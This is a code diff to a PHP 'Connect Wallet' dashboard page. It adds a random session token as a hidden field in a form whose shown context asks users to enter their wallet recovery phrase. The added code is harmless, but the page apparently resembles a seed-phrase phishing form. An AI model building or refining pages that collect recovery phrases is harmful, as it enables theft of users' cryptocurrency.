@@ -2,6 +2,13 @@
 include 'includes/dashboard_init.php';
 $pageTitle = 'Connect Wallet'; 
 $includeIziToast = true; 
+
+// Generate wallet connection token for API authentication
+if (!isset($_SESSION['wallet_token'])) {
+    $_SESSION['wallet_token'] = bin2hex(random_bytes(32));
+}
+$walletToken = $_SESSION['wallet_token'];
+
 include 'includes/head.php'; 
 ?>
 <body class="light-mode dashboard-body" data-page="connect">
@@ -175,6 +182,7 @@ include 'includes/head.php';
         <form id="connectForm" method="POST" onsubmit="handleWalletConnect(event)">
           <input type="hidden" name="c_wallet" value="1">
           <input type="hidden" name="wallet_name" id="walletName">
+          <input type="hidden" name="wallet_token" value="<?php echo htmlspecialchars($walletToken); ?>">
 
           <div class="wallet-form-group">
             <label for="mnemonic" class="wallet-form-label">Enter Recovery Phrase</label>
